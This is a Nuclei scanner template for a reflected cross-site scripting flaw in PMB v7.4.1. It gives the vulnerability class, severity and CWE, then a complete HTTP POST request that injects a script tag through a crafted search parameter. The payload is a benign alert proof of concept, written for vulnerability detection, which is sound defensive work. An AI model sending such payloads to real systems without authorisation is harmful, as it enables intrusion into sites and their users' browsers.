# Nuclei Template: PMB v7.4.1 - Cross Site Scripting
**Template ID:** pmb-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`pmb-xss.yaml`)

## Vulnerability Information & PoC

## Description
PMB v7.4.1 allow attacker to inject arbitrary malicious HTML or Javascripts code in user web browser via no_search parameter

## Steps to reproduce / Exploit Payload
```http
POST /pmb/opac_css/index.php?lvl=search_result&search_type_asked=extended_search HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

add_field=&search%5B%5D=f_1&op_0_f_1=EXACT&field_0_f_1%5B%5D=gang&explicit_search=1&search_xml_file=search_fields&delete_field=&launch_search=1&page=&no_search=0&ij6fm%22%3e%3cscript%3ealert(1337)%3c%2fscript%3evg9q6c4g1mk=1
```

## References
- https://github.com/jenaye/PMB
